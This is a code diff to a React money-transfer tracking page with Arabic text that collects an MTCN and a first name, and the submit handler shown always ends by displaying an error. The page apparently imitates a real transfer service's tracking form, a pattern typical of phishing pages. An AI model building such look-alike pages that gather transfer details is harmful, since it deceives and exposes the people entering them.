@@ -25,7 +25,7 @@ export default function TrackTransfer() {
   const [firstName, setFirstName] = useState("");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const [sending, setSending] = useState(false);
-  const [showResult, setShowResult] = useState(false);
+  const [showError, setShowError] = useState(false);
 
   const handleSubmit = async (tab: "sender" | "receiver", name: string) => {
     const mtcnValue = mtcn.join("");
@@ -39,16 +39,8 @@ export default function TrackTransfer() {
     } catch {
     } finally {
       setSending(false);
-      setShowResult(true);
+      setShowError(true);
     }
-  };
-
-  const formatMtcnDisplay = () => {
-    const d = mtcn;
-    const g1 = d.slice(0, 3).join(" ");
-    const g2 = d.slice(3, 6).join(" ");
-    const g3 = d.slice(6, 10).join(" ");
-    return `${g1} - ${g2} - ${g3}`;
   };
 
   const handleMtcnChange = (index: number, value: string) => {
@@ -97,41 +89,8 @@ export default function TrackTransfer() {
         </button>
       </div>
 
-      {/* Result Screen */}
-      {showResult && (
-        <div className="flex-1 flex flex-col px-6 pt-10 pb-8">
-          {/* MTCN Display */}
-          <div dir="ltr" className="text-center mb-8">
-            <p className="text-2xl font-light tracking-widest text-gray-800 leading-loose">
-              {formatMtcnDisplay()}
-            </p>
-            <div dir="ltr" className="flex justify-center gap-2 mt-1">
-              {mtcn.map((_, i) => (
-                <span key={i} className={`inline-block w-5 border-b border-gray-400 ${[3,6].includes(i) ? "mx-2" : ""}`} />
-              ))}
-            </div>
-          </div>
-
-          {/* Error Message */}
-          <div className="text-center mb-10">
-            <p className="text-[#c0392b] font-bold text-base leading-relaxed">
-              We can't find that transfer. Please check and re-enter the information below.
-            </p>
-          </div>
-
-          {/* Continue Button */}
-          <button
-            onClick={() => setShowResult(false)}
-            className="w-full text-white py-4 rounded text-base font-medium transition-colors"
-            style={{ backgroundColor: "#1e3a6e", border: "2px solid #2a4a8e" }}
-          >
-            المتابعة
-          </button>
-        </div>
-      )}
-
       {/* Main Content */}
-      <main className={`flex-1 px-4 pt-4 pb-8 ${showResult ? "hidden" : ""}`}>
+      <main className="flex-1 px-4 pt-4 pb-8">
         <h1 className="text-2xl font-bold text-gray-900 mb-5 text-left">تتبع تحويل</h1>
 
         {/* Tabs */}
@@ -188,6 +147,13 @@ export default function TrackTransfer() {
               ))}
             </div>
 
+            {/* Red Error after submit */}
+            {showError && (
+              <p className="text-sm font-medium" style={{ color: "#c0392b" }}>
+                track-transfer.mtcn_text_input_error_new
+              </p>
+            )}
+
             {/* First Name Input */}
             <div>
               <input
@@ -235,6 +201,13 @@ export default function TrackTransfer() {
                 />
               ))}
             </div>
+
+            {/* Red Error after submit */}
+            {showError && (
+              <p className="text-sm font-medium" style={{ color: "#c0392b" }}>
+                track-transfer.mtcn_text_input_error_new
+              </p>
+            )}
 
             <div>
               <input
